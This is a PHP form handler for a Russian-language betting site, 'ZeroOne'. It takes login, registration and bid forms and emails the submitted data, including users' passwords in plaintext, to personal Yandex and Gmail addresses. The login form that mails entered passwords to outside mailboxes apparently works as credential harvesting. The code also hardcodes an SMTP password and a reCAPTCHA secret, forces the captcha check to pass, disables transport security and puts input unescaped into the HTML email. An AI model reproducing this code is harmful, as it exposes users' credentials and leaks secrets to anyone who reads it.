<?php

if ( empty($_POST) ) {

	exit;

}

require 'vendor/autoload.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;


// reCAPTCHA v3
// https://www.google.com/recaptcha/admin/

$recaptcha_check = false;

$recaptcha_url = 'https://www.google.com/recaptcha/api/siteverify';
$recaptcha_secret = '6LcMlS8lAAAAAIEHFKZiLoy_yBP3YTmSlKhuZz_q';
//$recaptcha_response = $_POST['recaptcha_response'];

$recaptcha_check = true;
/*
if ( empty($recaptcha_response) === false ) {

    $recaptcha = file_get_contents($recaptcha_url . '?secret=' . $recaptcha_secret . '&response=' . $recaptcha_response);
    $recaptcha = json_decode($recaptcha);

	if ( $recaptcha["success"] and $recaptcha["score"] >= 0.5 ) {

		$recaptcha_check = true;

	}

}
*/
// логируем письма

$log = date('d.m.y H:i') . "\r\n";

foreach ( $_POST as $key => $value ) {

	if ( in_array( $key , array('subject', 'recaptcha_response', 'password') ) ) {

		continue;

	}

	$log .= $value . "\r\n";

}

$log .= "___________\r\n";

if ( $recaptcha_check === false ) {

	$fp = fopen('log-invalid-recaptcha.txt', "a");
	fwrite($fp, $log);
	fclose($fp);

	echo '{"title":"reCaptcha error","message":"Пожалуйста, свяжитесь с менеджером на прямую"}';

	exit;

} else {

	$fp = fopen('log-mail.txt', "a");
	fwrite($fp, $log);
	fclose($fp);

}

// отправляем письмо

$mail = new PHPMailer();

//Server settings
//$mail->SMTPDebug = SMTP::DEBUG_SERVER;

//$mail->isSMTP();
$mail->SMTPAuth   = true;
$mail->Host       = 'mail.zeroone.bet';
$mail->Username   = 'info@zeroone.bet';
$mail->Password   = 'yC1nI6fS6aoC8eE2';
$mail->SMTPSecure = 'none';
$mail->Port       = 587;

//Recipients
$mail->setFrom('info@zeroone.bet', 'ZeroOne');
$mail->addAddress('79198889134@ya.ru');
$mail->addAddress('Slezin.i@gmail.com');
$mail->addAddress('me@artin.studio');

//Content

$html = '';

if ( empty($_POST['name']) === false ) {

	$html .= '<b>Имя:</b> ' . $_POST['name'];

}

if ( empty($_POST['login']) === false ) {

	$html .= '<b>Логин:</b> ' . $_POST['login'];

}

if ( empty($_POST['email']) === false ) {

	$html .= '<br><b>E-mail:</b> ' . $_POST['email'];

}
if ( empty($_POST['nick']) === false ) {

	$html .= '<br><b>Ваш ник:</b> ' . $_POST['nick'];

}

if ( empty($_POST['password']) === false ) {

	$html .= '<br><b>Пароль:</b> ' . $_POST['password'];

}

if ( empty($_POST['telegram']) === false ) {

	$html .= '<br><b>Телеграм:</b> ' . $_POST['telegram'];

}


if ( $_POST['subject'] === 'bid' ) {

	$html .= '<br><b>Валюта для оплаты:</b> ' . $_POST['currency'];
	$html .= '<br><b>Выберите игру:</b> ' . $_POST['game'];

}

$subject = 'Войти';

if ( $_POST['subject'] === 'modal-reg' ) {

	$subject = 'Регистрация';

}

if ( $_POST['subject'] === 'feedback' ) {

	$subject = 'Оставайся на связи';

}

if ( in_array( $_POST['subject'] , array('bid', 'bid-reg') ) ) {

	$subject = 'Поставь на победу';

}

$mail->CharSet  = 'UTF-8';
$mail->Subject = $subject;
$mail->msgHTML($html);


//send the message, check for errors

$success = new class{};

if ( $mail->send() ) {

	$success->status = "ok";
	$success->title  = "Ваша заявка отправлена!";
	$success->message  = "Спасибо, что решили воспользоваться нашим сервисом! В ближайшее время с вами свяжется наш менеджер.";

	if ( $_POST['subject'] === 'feedback' ) {

		$success->status = "ok";
		$success->title = "Ваше обращение отправлено!";
		$success->message  = "Спасибо, что решили воспользоваться нашим сервисом! В ближайшее время с вами свяжется наш менеджер.";

	}

	if ( in_array( $_POST['subject'] , array('modal-reg', 'bid-reg') ) ) {

		$success->status = "reg";
		$success->title = "Ваша заявка на регистрацию в&nbsp;системе отправлена!";
		$success->message  = "В данный момент сервис находится на стадии бета-тестирования. На вашу электронную почту поступит письмо о запуске сервиса. <br>Благодарим за ожидание!";

	}

} else {

	$success->title  = "Что-то пошло не так.";
	$success->message  = "Ваши данные не были отправлены, пожалуйста, попробуйте еще раз позднее. <br>" . $mail->ErrorInfo;

}

echo json_encode( $success );